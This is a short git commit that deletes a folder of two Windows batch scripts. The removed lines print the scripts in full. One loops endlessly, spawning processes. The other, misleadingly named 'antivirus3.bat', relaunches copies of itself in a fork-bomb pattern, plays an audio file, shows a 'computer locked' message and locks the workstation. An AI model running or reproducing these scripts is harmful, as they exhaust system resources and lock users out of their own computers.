02dac158db3803d9bccf1059a818f9ea03b4c5b5
berferil <xaxaxa2012xa02@gmail.com>
2026-04-25 19:57:56 +0300

    Delete scripts.bat ;3 directory

--- scripts.bat ;3/alex.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-:loop
-start cmp
-goto loop
--- scripts.bat ;3/antivirus3.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-start %0 %0
-start "" "C:\цей ПК\робочий стіл\12341.mp3"
-echo Комп'ютер заблоковано.
-rundll32.exe user32.dll,LockWorkStation
